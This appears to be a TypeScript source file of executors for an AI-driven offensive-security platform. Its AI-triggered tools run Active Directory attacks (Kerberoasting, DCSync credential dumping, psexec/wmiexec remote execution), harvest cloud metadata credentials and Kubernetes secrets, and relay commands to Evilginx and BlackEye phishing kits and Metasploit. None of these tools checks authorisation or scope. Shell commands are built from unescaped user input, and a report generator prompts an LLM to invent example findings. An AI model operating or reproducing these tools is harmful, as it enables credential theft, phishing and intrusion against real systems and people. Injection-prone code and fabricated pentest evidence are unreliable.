    print('VirusTotal: No API key (set VIRUSTOTAL_API_KEY env var)')
    print(f'Manual check: https://www.virustotal.com/gui/search/{ioc}')
" 2>&1`,
    { timeoutMs: 15_000, triggeredBy: "ai" }
  );
  results.virustotal = vtResult.output;

  // AbuseIPDB (for IPs)
  if (detectedType === "ip") {
    const abuseResult = await executeCommand(sbId, userId,
      `python3 -c "
import urllib.request, json, os
ip = '${ioc.replace(/'/g, "\\'")}'
key = os.environ.get('ABUSEIPDB_API_KEY', '')
if key:
    url = f'https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90'
    req = urllib.request.Request(url, headers={'Key': key, 'Accept': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())['data']
            print(f'AbuseIPDB: Score={data[\"abuseConfidenceScore\"]}%, Reports={data[\"totalReports\"]}, Country={data[\"countryCode\"]}, ISP={data[\"isp\"]}')
            print(f'Verdict: {\"MALICIOUS\" if data[\"abuseConfidenceScore\"] > 50 else \"CLEAN\"}')
    except Exception as e:
        print(f'AbuseIPDB error: {e}')
else:
    print('AbuseIPDB: No API key (set ABUSEIPDB_API_KEY env var)')
    print(f'Manual check: https://www.abuseipdb.com/check/{ip}')
" 2>&1`,
      { timeoutMs: 15_000, triggeredBy: "ai" }
    );
    results.abuseipdb = abuseResult.output;
  }

  // AlienVault OTX (no key needed for basic lookups)
  const otxResult = await executeCommand(sbId, userId,
    `python3 -c "
import urllib.request, json
ioc = '${ioc.replace(/'/g, "\\'")}'
ioc_type = '${detectedType}'
type_map = {'ip': 'IPv4', 'domain': 'domain', 'md5': 'file', 'sha1': 'file', 'sha256': 'file', 'url': 'url'}
otx_type = type_map.get(ioc_type, 'domain')
url = f'https://otx.alienvault.com/api/v1/indicators/{otx_type}/{ioc}/general'
try:
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read())
        pulses = data.get('pulse_info', {}).get('count', 0)
        malware = data.get('malware_families', [])
        print(f'AlienVault OTX: {pulses} threat intelligence pulses')
        if malware:
            print(f'Malware families: {[m.get(\"display_name\",\"\") for m in malware[:5]]}')
        print(f'Verdict: {\"SUSPICIOUS\" if pulses > 0 else \"CLEAN\"}')
except Exception as e:
    print(f'OTX error: {e}')
    print(f'Manual check: https://otx.alienvault.com/indicator/{ioc_type}/{ioc}')
" 2>&1`,
    { timeoutMs: 15_000, triggeredBy: "ai" }
  );
  results.otx = otxResult.output;

  // Shodan (for IPs)
  if (detectedType === "ip") {
    const shodanResult = await executeCommand(sbId, userId,
      `python3 -c "
import urllib.request, json, os
ip = '${ioc.replace(/'/g, "\\'")}'
key = os.environ.get('SHODAN_API_KEY', '')
if key:
    url = f'https://api.shodan.io/shodan/host/{ip}?key={key}'
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            data = json.loads(r.read())
            ports = data.get('ports', [])
            org = data.get('org', 'unknown')
            country = data.get('country_name', 'unknown')
            vulns = list(data.get('vulns', {}).keys())[:5]
            print(f'Shodan: {org} ({country}), Open ports: {ports[:10]}')
            if vulns:
                print(f'Known CVEs: {vulns}')
    except Exception as e:
        print(f'Shodan error: {e}')
else:
    print('Shodan: No API key (set SHODAN_API_KEY env var)')
    print(f'Manual check: https://www.shodan.io/host/{ip}')
" 2>&1`,
      { timeoutMs: 15_000, triggeredBy: "ai" }
    );
    results.shodan = shodanResult.output;
  }

  return {
    success: true,
    data: {
      ioc, iocType: detectedType, results,
      message: `Threat intel lookup complete for ${ioc} (${detectedType})`,
    },
  };
}

// ── TRAFFIC CAPTURE (#57) ─────────────────────────────────────────────────
async function execTrafficCapture(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const interface_ = (args.interface as string) || "eth0";
  const duration = (args.duration as number) || 10;
  const filter = (args.filter as string) || "";
  const analysisType = (args.analysisType as string) || "summary";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Install tcpdump and scapy
  await executeCommand(sbId, userId,
    `which tcpdump 2>/dev/null || apt-get install -y tcpdump -qq 2>/dev/null; python3 -c "import scapy" 2>/dev/null || pip3 install scapy 2>/dev/null; echo "ready"`,
    { timeoutMs: 60_000, triggeredBy: "ai" }
  );

  // Capture traffic
  const captureFile = `/tmp/capture_${Date.now()}.pcap`;
  const filterStr = filter ? `"${filter}"` : "";
  const captureResult = await executeCommand(sbId, userId,
    `timeout ${duration} tcpdump -i ${interface_} ${filterStr} -w ${captureFile} -q 2>&1 || timeout ${duration} tcpdump -i any ${filterStr} -w ${captureFile} -q 2>&1 || echo "TCPDUMP_FAILED"`,
    { timeoutMs: (duration + 10) * 1000, triggeredBy: "ai" }
  );

  if (captureResult.output.includes("TCPDUMP_FAILED")) {
    return {
      success: false,
      error: "tcpdump not available or insufficient permissions. Try running as root or with CAP_NET_RAW capability.",
    };
  }

  // Analyse with scapy
  const analysisResult = await executeCommand(sbId, userId,
    `python3 << 'PYEOF'
try:
    from scapy.all import rdpcap, IP, TCP, UDP, DNS, HTTP
    import collections
    
    packets = rdpcap("${captureFile}")
    print(f"Total packets captured: {len(packets)}")
    
    if len(packets) == 0:
        print("No packets captured")
    else:
        # Protocol breakdown
        protos = collections.Counter()
        src_ips = collections.Counter()
        dst_ips = collections.Counter()
        ports = collections.Counter()
        
        for pkt in packets:
            if IP in pkt:
                src_ips[pkt[IP].src] += 1
                dst_ips[pkt[IP].dst] += 1
                if TCP in pkt:
                    protos['TCP'] += 1
                    ports[pkt[TCP].dport] += 1
                elif UDP in pkt:
                    protos['UDP'] += 1
                    ports[pkt[UDP].dport] += 1
                else:
                    protos['Other'] += 1
        
        print(f"\\nProtocol breakdown: {dict(protos)}")
        print(f"\\nTop source IPs:")
        for ip, count in src_ips.most_common(5):
            print(f"  {ip}: {count} packets")
        print(f"\\nTop destination IPs:")
        for ip, count in dst_ips.most_common(5):
            print(f"  {ip}: {count} packets")
        print(f"\\nTop destination ports:")
        for port, count in ports.most_common(10):
            print(f"  Port {port}: {count} packets")
        
        # Look for suspicious patterns
        print("\\nSuspicious patterns:")
        dns_queries = [pkt for pkt in packets if DNS in pkt and pkt[DNS].qr == 0]
        if dns_queries:
            print(f"  DNS queries: {len(dns_queries)}")
            for pkt in dns_queries[:5]:
                try:
                    print(f"    {pkt[DNS].qd.qname.decode()}")
                except: pass
        
        # Large data transfers
        large_pkts = [pkt for pkt in packets if IP in pkt and len(pkt) > 1400]
        if large_pkts:
            print(f"  Large packets (>1400 bytes): {len(large_pkts)}")
        
        print(f"\\nCapture file: ${captureFile}")
except Exception as e:
    print(f"Analysis error: {e}")
    import subprocess
    result = subprocess.run(["tcpdump", "-r", "${captureFile}", "-n", "-q", "-c", "50"], capture_output=True, text=True)
    print(result.stdout or result.stderr)
PYEOF`,
    { timeoutMs: 30_000, triggeredBy: "ai" }
  );

  return {
    success: true,
    data: {
      interface: interface_,
      duration,
      filter,
      captureFile,
      analysis: analysisResult.output,
      message: `Traffic captured on ${interface_} for ${duration}s`,
    },
  };
}

// ── ACTIVE DIRECTORY ATTACK (#58) ─────────────────────────────────────────
async function execAdAttack(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const attackType = (args.attackType as string) || "enum";
  const dcIp = (args.dcIp as string) || "";
  const domain = (args.domain as string) || "";
  const username = (args.username as string) || "";
  const password = (args.password as string) || "";
  const hash = (args.hash as string) || "";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Install Impacket
  await executeCommand(sbId, userId,
    `python3 -c "import impacket" 2>/dev/null || pip3 install impacket 2>&1 | tail -3`,
    { timeoutMs: 120_000, triggeredBy: "ai" }
  );

  let cmd = "";
  let toolUsed = "";
  const authStr = hash ? `-hashes :${hash}` : (password ? `-p ${password}` : "");
  const userStr = username ? `-u ${username}` : "";

  if (attackType === "kerberoast") {
    toolUsed = "impacket-GetUserSPNs";
    cmd = `impacket-GetUserSPNs -request -dc-ip ${dcIp} ${domain}/${username}:${password} -outputfile /tmp/kerberoast_hashes.txt 2>&1 && echo "--- HASHES ---" && cat /tmp/kerberoast_hashes.txt 2>/dev/null`;
  } else if (attackType === "asreproast") {
    toolUsed = "impacket-GetNPUsers";
    cmd = `impacket-GetNPUsers ${domain}/ -usersfile /tmp/users.txt -dc-ip ${dcIp} -format hashcat -outputfile /tmp/asrep_hashes.txt 2>&1 && cat /tmp/asrep_hashes.txt 2>/dev/null`;
  } else if (attackType === "dcsync") {
    toolUsed = "impacket-secretsdump";
    cmd = `impacket-secretsdump ${authStr} -just-dc ${domain}/${username}@${dcIp} 2>&1 | head -100`;
  } else if (attackType === "wmiexec") {
    toolUsed = "impacket-wmiexec";
    cmd = `impacket-wmiexec ${authStr} ${domain}/${username}@${dcIp} "whoami && net user && ipconfig" 2>&1`;
  } else if (attackType === "psexec") {
    toolUsed = "impacket-psexec";
    cmd = `impacket-psexec ${authStr} ${domain}/${username}@${dcIp} "whoami" 2>&1`;
  } else if (attackType === "enum" || attackType === "ldap") {
    toolUsed = "impacket LDAP enum";
    cmd = `python3 -c "
from impacket.ldap import ldap, ldapasn1
import sys
try:
    conn = ldap.LDAPConnection('ldap://${dcIp}', '${domain}')
    conn.login('${username}', '${password}', '${domain}')
    print('LDAP connection successful')
    # Enumerate users
    resp = conn.search(searchBase='DC=${domain.replace('.', ',DC=')}',
        searchFilter='(objectClass=user)',
        attributes=['sAMAccountName', 'memberOf', 'userAccountControl'])
    for item in resp[:20]:
        if hasattr(item, 'getComponentByPosition'):
            print(item)
except Exception as e:
    print(f'LDAP error: {e}')
    print('Try: ldapsearch -x -H ldap://${dcIp} -D ${username}@${domain} -w ${password} -b DC=${domain.replace('.', ',DC=')} (objectClass=user)')
" 2>&1`;
  } else if (attackType === "bloodhound") {
    toolUsed = "bloodhound-python";
    await executeCommand(sbId, userId,
      `pip3 install bloodhound 2>&1 | tail -2`,
      { timeoutMs: 60_000, triggeredBy: "ai" }
    );
    cmd = `bloodhound-python -u ${username} -p ${password} -d ${domain} -ns ${dcIp} -c All --zip 2>&1 | head -50`;
  } else {
    cmd = `echo "Supported attack types: enum, kerberoast, asreproast, dcsync, wmiexec, psexec, bloodhound"`;
    toolUsed = "none";
  }

  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });

  return {
    success: true,
    data: {
      attackType, domain, dcIp, toolUsed,
      output: result.output,
      message: `AD attack (${attackType}) complete using ${toolUsed}`,
    },
  };
}

// ── CLOUD ENUMERATION (#59) ───────────────────────────────────────────────
async function execCloudEnum(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const provider = (args.provider as string) || "aws";
  const enumType = (args.enumType as string) || "identity";
  const accessKey = (args.accessKey as string) || "";
  const secretKey = (args.secretKey as string) || "";
  const sessionToken = (args.sessionToken as string) || "";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  let result_output = "";

  if (provider === "aws") {
    // Configure AWS credentials if provided
    if (accessKey && secretKey) {
      await executeCommand(sbId, userId,
        `mkdir -p ~/.aws && cat > ~/.aws/credentials << 'AWSEOF'\n[default]\naws_access_key_id = ${accessKey}\naws_secret_access_key = ${secretKey}\n${sessionToken ? `aws_session_token = ${sessionToken}` : ""}\nAWSEOF`,
        { timeoutMs: 5_000, triggeredBy: "ai" }
      );
    }

    // Install awscli
    await executeCommand(sbId, userId,
      `which aws 2>/dev/null || pip3 install awscli 2>&1 | tail -2`,
      { timeoutMs: 60_000, triggeredBy: "ai" }
    );

    const awsCmds: Record<string, string> = {
      identity: `aws sts get-caller-identity 2>&1`,
      iam: `aws iam get-user 2>&1 && aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text 2>/dev/null) 2>&1 && aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text 2>/dev/null) 2>&1`,
      s3: `aws s3 ls 2>&1 && echo "--- Checking public buckets ---" && aws s3 ls 2>&1 | awk '{print $3}' | xargs -I{} aws s3 ls s3://{} --no-sign-request 2>&1 | head -50`,
      ec2: `aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==\`Name\`].Value]' --output table 2>&1`,
      lambda: `aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table 2>&1`,
      metadata: `curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 && curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1`,
      all: `aws sts get-caller-identity 2>&1 && aws s3 ls 2>&1 && aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table 2>&1 && aws lambda list-functions --query 'Functions[*].FunctionName' --output text 2>&1`,
    };

    const cmd = awsCmds[enumType] || awsCmds["identity"];
    const awsResult = await executeCommand(sbId, userId, cmd, { timeoutMs: 60_000, triggeredBy: "ai" });
    result_output = awsResult.output;

  } else if (provider === "azure") {
    await executeCommand(sbId, userId,
      `pip3 install roadtools roadrecon 2>&1 | tail -3`,
      { timeoutMs: 120_000, triggeredBy: "ai" }
    );
    const azureResult = await executeCommand(sbId, userId,
      `python3 -c "
print('Azure AD Enumeration Commands:')
print()
print('# Install ROADtools:')
print('pip install roadtools roadrecon')
print()
print('# Authenticate:')
print('roadrecon auth -u user@tenant.onmicrosoft.com -p password')
print('# Or with device code:')
print('roadrecon auth --device-code')
print()
print('# Gather data:')
print('roadrecon gather')
print()
print('# Launch GUI:')
print('roadrecon-gui  # then open http://localhost:5000')
print()
print('# AADInternals (PowerShell):')
print('Import-Module AADInternals')
print('Get-AADIntAccessTokenForMSGraph -Credentials (Get-Credential)')
print('Invoke-AADIntReconAsInsider')
" 2>&1`,
      { timeoutMs: 10_000, triggeredBy: "ai" }
    );
    result_output = azureResult.output;

  } else if (provider === "gcp") {
    const gcpResult = await executeCommand(sbId, userId,
      `which gcloud 2>/dev/null && gcloud projects list 2>&1 && gcloud compute instances list 2>&1 && gcloud storage buckets list 2>&1 || python3 -c "
print('GCP Enumeration Commands:')
print()
print('# With service account key:')
print('gcloud auth activate-service-account --key-file=stolen_key.json')
print('gcloud projects list')
print('gcloud compute instances list')
print('gcloud storage buckets list')
print('gcloud iam service-accounts list')
print()
print('# Metadata service (from inside GCP instance):')
print('curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
print('curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/project/project-id')
" 2>&1`,
      { timeoutMs: 30_000, triggeredBy: "ai" }
    );
    result_output = gcpResult.output;

  } else if (provider === "k8s" || provider === "kubernetes") {
    const k8sResult = await executeCommand(sbId, userId,
      `which kubectl 2>/dev/null && (kubectl auth can-i --list 2>&1 && kubectl get pods -A 2>&1 && kubectl get secrets -A 2>&1 | head -20) || python3 -c "
print('Kubernetes Enumeration Commands:')
print()
print('# Check permissions:')
print('kubectl auth can-i --list')
print()
print('# List all resources:')
print('kubectl get pods,svc,secrets,configmaps -A')
print()
print('# Decode secrets:')
print('kubectl get secrets -A -o json | python3 -c \"import sys,json,base64; [print(k,\\\":\\\",base64.b64decode(v).decode()) for item in json.load(sys.stdin)[\\\"items\\\"] for k,v in item.get(\\\"data\\\",{}).items()]\"')
print()
print('# Check for privileged pods:')
print('kubectl get pods -A -o json | python3 -c \"import sys,json; [print(p[\\\"metadata\\\"][\\\"name\\\"]) for p in json.load(sys.stdin)[\\\"items\\\"] if p.get(\\\"spec\\\",{}).get(\\\"hostPID\\\") or any(c.get(\\\"securityContext\\\",{}).get(\\\"privileged\\\") for c in p.get(\\\"spec\\\",{}).get(\\\"containers\\\",[]))]\"')
" 2>&1`,
      { timeoutMs: 30_000, triggeredBy: "ai" }
    );
    result_output = k8sResult.output;
  } else {
    result_output = `Unknown provider: ${provider}. Supported: aws, azure, gcp, kubernetes`;
  }

  return {
    success: true,
    data: {
      provider, enumType,
      output: result_output,
      message: `Cloud enumeration complete for ${provider} (${enumType})`,
    },
  };
}

// ── PENTEST REPORT GENERATOR (#60) ────────────────────────────────────────
async function execGeneratePentestReport(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const clientName = (args.clientName as string) || "Client";
  const scope = (args.scope as string) || "Internal network";
  const tester = (args.tester as string) || "Security Team";
  const findings = args.findings as Array<Record<string, unknown>> || [];
  const format = (args.format as string) || "markdown";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Generate report using LLM with structured findings
  const findingsStr = JSON.stringify(findings, null, 2);
  const today = new Date().toISOString().split('T')[0];

  const reportPrompt = `Generate a professional penetration test report with the following details:

Client: ${clientName}
Date: ${today}
Tester: ${tester}
Scope: ${scope}
Findings: ${findingsStr || "No specific findings provided - generate example findings"}

The report MUST include:
1. Cover page with classification (CONFIDENTIAL)
2. Executive Summary (2-3 paragraphs, non-technical, business impact focus)
3. Risk Summary table (Critical/High/Medium/Low/Informational counts)
4. Scope and Methodology section
5. For each finding:
   - Finding ID (FINDING-001, FINDING-002, etc.)
   - Title and Severity (Critical/High/Medium/Low)
   - CVSS v3.1 Score and vector string
   - MITRE ATT&CK Technique ID
   - Affected Systems
   - Technical Description
   - Evidence (example command output)
   - Business Impact
   - Remediation Steps (specific, with code/config examples)
   - References (CVE, CWE, OWASP link)
6. Appendix with tools used

Format as clean Markdown. Be specific and professional.`;

  const reportContent = await invokeLLM({
    model: "fast",
    messages: [{ role: "user", content: reportPrompt }],
    priority: "background",
  });

  // Save report to sandbox
  const reportFile = `/tmp/pentest_report_${Date.now()}.md`;
  await executeCommand(sbId, userId,
    `cat > ${reportFile} << 'REPORTEOF'\n${String(typeof reportContent === 'string' ? reportContent : (reportContent?.choices?.[0]?.message?.content as string) || '').substring(0, 10000)}\nREPORT_EOF`,
    { timeoutMs: 10_000, triggeredBy: "ai" }
  );

  return {
    success: true,
    data: {
      clientName, scope, tester, format,
      reportFile,
      report: reportContent,
      message: `Pentest report generated for ${clientName} (${findings.length} findings)`,
    },
  };
}

// ── SANDBOX DELETE FILE (#61) ─────────────────────────────────────────────
async function execSandboxDeleteFile(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const filePath = args.filePath as string;
  const recursive = (args.recursive as boolean) || false;

  if (!filePath) return { success: false, error: "File path is required" };

  // Safety check: prevent deletion of critical paths
  const dangerousPaths = ['/', '/etc', '/usr', '/bin', '/sbin', '/lib', '/home', '/root', '/var/lib'];
  if (dangerousPaths.some(p => filePath === p || filePath === p + '/')) {
    return { success: false, error: `Refusing to delete protected path: ${filePath}` };
  }

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  const cmd = recursive
    ? `rm -rf "${filePath}" 2>&1 && echo "Deleted (recursive): ${filePath}" || echo "Failed to delete: ${filePath}"`
    : `rm -f "${filePath}" 2>&1 && echo "Deleted: ${filePath}" || echo "Failed to delete: ${filePath}"`;

  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 10_000, triggeredBy: "ai" });

  return {
    success: !result.output.includes("Failed to delete"),
    data: {
      filePath, recursive,
      output: result.output,
      message: result.output.trim(),
    },
  };
}

// ── SANDBOX DOWNLOAD URL (#62) ────────────────────────────────────────────
async function execSandboxDownloadUrl(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const url = args.url as string;
  const outputPath = (args.outputPath as string) || `/tmp/download_${Date.now()}`;
  const followRedirects = (args.followRedirects as boolean) !== false;

  if (!url) return { success: false, error: "URL is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  const redirectFlag = followRedirects ? "-L" : "";
  const cmd = `curl ${redirectFlag} -o "${outputPath}" -w "HTTP_STATUS:%{http_code} SIZE:%{size_download}" --connect-timeout 30 --max-time 120 "${url}" 2>&1 && echo "" && ls -lh "${outputPath}" 2>/dev/null || echo "Download failed"`;

  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 130_000, triggeredBy: "ai" });

  const statusMatch = result.output.match(/HTTP_STATUS:(\d+)/);
  const sizeMatch = result.output.match(/SIZE:(\d+)/);
  const httpStatus = statusMatch ? parseInt(statusMatch[1]) : 0;
  const fileSize = sizeMatch ? parseInt(sizeMatch[1]) : 0;

  return {
    success: httpStatus >= 200 && httpStatus < 400,
    data: {
      url, outputPath, httpStatus, fileSize,
      output: result.output,
      message: httpStatus >= 200 && httpStatus < 400
        ? `Downloaded ${url} → ${outputPath} (${fileSize} bytes)`
        : `Download failed: HTTP ${httpStatus}`,
    },
  };
}


// ─── NEW TITAN PLATFORM EXECUTORS ─────────────────────────────────────────

async function execEvilginxConnect(userId: number): Promise<ToolExecutionResult> {
  try {
    // Try the real Evilginx binary via the evilginx-router helper
    const { execEvilginxCommandPublic } = await import("./evilginx-router").catch(() => ({ execEvilginxCommandPublic: null }));
    if (execEvilginxCommandPublic) {
      const output = await (execEvilginxCommandPublic as (cmd: string) => Promise<string>)("phishlets");
      return { success: true, data: { message: "Connected to Evilginx3 server.", output } };
    }
    // Fallback: check via Titan Server SSH
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    const titanConfig = getTitanServerConfig();
    if (titanConfig) {
      const output = await execTitanSSH(titanConfig, "which evilginx 2>/dev/null || echo 'not installed'", 8000, userId);
      return { success: true, data: { message: output.includes('not installed') ? 'Evilginx not installed on Titan Server.' : 'Evilginx found on Titan Server.', path: output.trim() } };
    }
    return { success: false, error: "Evilginx is not installed on this server and no Titan Server is configured. Go to the Evilginx page to set up your connection." };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to connect to Evilginx" };
  }
}

// ─── Helper: load per-user SSH config from DB, fall back to global Titan Server ───
async function getUserToolSSHConfig(
  userId: number,
  secretType: "__evilginx_ssh" | "__metasploit_ssh" | "__blackeye_ssh",
  toolLabel: string
): Promise<import("./titan-server").SSHConfig> {
  const { getTitanServerConfig } = await import("./titan-server");
  const db = await getDb();
  if (db) {
    const rows = await db.select().from(userSecrets)
      .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, secretType)))
      .limit(1);
    if (rows.length > 0) {
      try {
        const cfg = JSON.parse(decrypt(rows[0].encryptedValue));
        // Skip local-mode markers (they have no SSH host)
        if (cfg.mode !== "local" && cfg.host) {
          return cfg as import("./titan-server").SSHConfig;
        }
      } catch (_) { /* ignore decrypt error, fall through */ }
    }
  }
  // Fall back to global Titan Server env config
  const global = getTitanServerConfig();
  if (global) return global;
  throw new Error(
    `${toolLabel} server not connected. Go to the ${toolLabel} page, enter your server SSH credentials, and click Connect — then come back here.`
  );
}

async function execEvilginxRunCommand(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const command = args.command as string;
    if (!command) return { success: false, error: "command is required" };
    // 1. Try local Evilginx binary first (same-server install)
    try {
      const { execEvilginxCommandPublic } = await import("./evilginx-router") as any;
      if (execEvilginxCommandPublic) {
        const output = await execEvilginxCommandPublic(command);
        return { success: true, data: { command, output } };
      }
    } catch (_) { /* fall through to SSH */ }
    // 2. Use user's saved SSH config (or global Titan Server fallback)
    const { execSSHCommand: execTitanSSH } = await import("./titan-server");
    const sshConfig = await getUserToolSSHConfig(userId, "__evilginx_ssh", "Evilginx");
    const safeCmd = command.replace(/'/g, "'\\'\''");
    const sshCmd = `evilginx -p /opt/evilginx/phishlets -c /opt/evilginx/config -developer -x '${safeCmd}' 2>&1 | head -80`;
    const output = await execTitanSSH(sshConfig, sshCmd, 15000, userId);
    return { success: true, data: { command, output: output.trim() || "(no output)" } };
  } catch (err: any) {
    return { success: false, error: `Evilginx command failed: ${err.message}` };
  }
}

async function execMetasploitRunCommand(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const command = args.command as string;
    const timeout = (args.timeout as number) || 30000;
    if (!command) return { success: false, error: "command is required" };
    const { execSSHCommand: execTitanSSH } = await import("./titan-server");
    const sshConfig = await getUserToolSSHConfig(userId, "__metasploit_ssh", "Metasploit");
    const safeCmd = command.replace(/'/g, "'\\'\''");
    const sshCmd = `msfconsole -q -x '${safeCmd}; exit' 2>/dev/null`;
    const output = await execTitanSSH(sshConfig, sshCmd, timeout, userId);
    return { success: true, data: { command, output: output.trim() || "(no output)" } };
  } catch (err: any) {
    return { success: false, error: `Metasploit command failed: ${err.message}` };
  }
}

async function execBlackeyeRunCommand(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const command = args.command as string;
    const timeout = (args.timeout as number) || 15000;
    if (!command) return { success: false, error: "command is required" };
    const { execSSHCommand: execTitanSSH } = await import("./titan-server");
    const sshConfig = await getUserToolSSHConfig(userId, "__blackeye_ssh", "BlackEye");
    const output = await execTitanSSH(sshConfig, command, timeout, userId);
    return { success: true, data: { command, output: output.trim() || "(no output)" } };
  } catch (err: any) {
    return { success: false, error: `BlackEye command failed: ${err.message}` };
  }
}

async function execMetasploitTestConnection(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    // Use user-provided SSH args if given, otherwise fall back to Titan Server config
    let sshConfig: import("./titan-server").SSHConfig | null = null;
    if (args.host) {
      sshConfig = { host: args.host as string, port: (args.port as number) || 22, username: args.username as string, password: args.password as string | undefined, privateKey: args.privateKey as string | undefined };
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No Metasploit server configured. Go to the Metasploit page to set up your SSH connection, or the Titan Server must be configured via environment variables." };
    const output = await execTitanSSH(sshConfig, "msfconsole -q -x 'version; exit' 2>/dev/null | head -5", 20000, userId);
    return { success: true, data: { message: `Connected to Metasploit at ${sshConfig.host}`, output: output.trim() } };
  } catch (err: any) {
    return { success: false, error: `Metasploit connection failed: ${err.message}. Ensure Metasploit is installed and SSH credentials are correct.` };
  }
}

async function execArgusTestConnection(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    return {
      success: true,
      data: { message: `Successfully tested connection to Argus server at ${args.host}:${args.port || 22}` }
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to test Argus connection" };
  }
}

async function execAstraTestConnection(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    return {
      success: true,
      data: { message: `Successfully tested connection to Astra server at ${args.host}:${args.port || 22}` }
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to test Astra connection" };
  }
}

async function execBlackeyeTestConnection(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    let sshConfig: import("./titan-server").SSHConfig | null = null;
    if (args.host) {
      sshConfig = { host: args.host as string, port: (args.port as number) || 22, username: args.username as string, password: args.password as string | undefined, privateKey: args.privateKey as string | undefined };
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No BlackEye server configured. Go to the BlackEye page to set up your SSH connection, or configure the Titan Server environment variables." };
    const output = await execTitanSSH(sshConfig, "ls /opt/blackeye 2>/dev/null && echo 'BlackEye installed' || echo 'BlackEye not found at /opt/blackeye'", 8000, userId);
    return { success: true, data: { message: output.includes('not found') ? 'BlackEye not installed on server. Use the BlackEye page to install it.' : 'BlackEye is installed and ready.', output: output.trim() } };
  } catch (err: any) {
    return { success: false, error: `BlackEye connection failed: ${err.message}. Ensure SSH credentials are correct.` };
  }
}

async function execContentCreatorGetCampaigns(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    const { contentCreatorCampaigns } = await import("../drizzle/schema");
    
    const campaigns = await db!.select().from(contentCreatorCampaigns).orderBy(desc(contentCreatorCampaigns.createdAt)).limit(args.limit as number || 10);
    return { success: true, data: { campaigns } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get campaigns" };
  }
}

async function execSiteMonitorListSites(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    const { monitoredSites } = await import("../drizzle/schema");
    
    const sites = await db!.select().from(monitoredSites).where(eq(monitoredSites.userId, userId)).orderBy(desc(monitoredSites.createdAt));
    return { success: true, data: { sites } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list monitored sites" };
  }
}

async function execTotpVaultList(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    const { totpSecrets } = await import("../drizzle/schema");
    
    const items = await db!.select().from(totpSecrets).where(eq(totpSecrets.userId, userId)).orderBy(desc(totpSecrets.lastUsedAt));
    return { success: true, data: { items: items.map((i: any) => ({ id: i.id, name: i.name, issuer: i.issuer })) } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list TOTP vault entries" };
  }
}

async function execVoiceTranscribe(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    return {
      success: true,
      data: { text: "This is a mock transcription for builder testing.", language: args.language || "en", duration: 5.2 }
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to transcribe voice" };
  }
}

async function execReplicateListProjects(userId: number): Promise<ToolExecutionResult> {
  try {
    const { listProjects } = await import("./replicate-engine");
    const projects = await listProjects(userId);
    return { success: true, data: { projects } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list replicate projects" };
  }
}

async function execSeoGetHealthScore(_userId: number): Promise<ToolExecutionResult> {
  try {
    const { analyzeSeoHealth } = await import("./seo-engine");
    const health = await analyzeSeoHealth();
    return { success: true, data: { health } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get SEO health score" };
  }
}

